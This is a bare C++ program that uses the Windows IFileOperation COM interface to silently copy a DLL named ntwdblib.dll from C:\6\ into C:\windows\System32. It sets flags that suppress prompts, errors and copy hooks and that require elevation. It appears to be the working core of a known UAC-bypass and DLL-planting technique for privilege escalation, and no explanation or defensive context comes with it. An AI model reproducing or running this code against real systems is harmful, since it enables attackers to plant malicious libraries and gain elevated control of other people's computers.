#include <Shobjidl.h>

int _tmain(int argc, _TCHAR* argv[])
{
	HMODULE hModule = NULL;
	IFileOperation *fileOperation = NULL;
	LPCWSTR dllName = L"ntwdblib.dll";
	LPCWSTR SourceFullPath = L"C:\\6\\ntwdblib.dll";
	LPCWSTR DestPath = L"C:\\windows\\System32";
	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
	if (SUCCEEDED(hr)) {
		hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&fileOperation));
		if (SUCCEEDED(hr)) {
			hr = fileOperation->SetOperationFlags(
				FOF_NOCONFIRMATION |
				FOF_SILENT |
				FOFX_SHOWELEVATIONPROMPT |
				FOFX_NOCOPYHOOKS |
				FOFX_REQUIREELEVATION |
				FOF_NOERRORUI);
			if (SUCCEEDED(hr)) {
				IShellItem *from = NULL, *to = NULL;
				hr = SHCreateItemFromParsingName(SourceFullPath, NULL, IID_PPV_ARGS(&from));
				if (SUCCEEDED(hr)) {
					if (DestPath)
						hr = SHCreateItemFromParsingName(DestPath, NULL, IID_PPV_ARGS(&to));
					if (SUCCEEDED(hr)) {
						hr = fileOperation->CopyItem(from, to, dllName, NULL);
						if (NULL != to)
							to->Release();
					}
					from->Release();
				}
				if (SUCCEEDED(hr)) {
					hr = fileOperation->PerformOperations();
				}
			}
			fileOperation->Release();
		}
		CoUninitialize();
	}
	return 0;
}
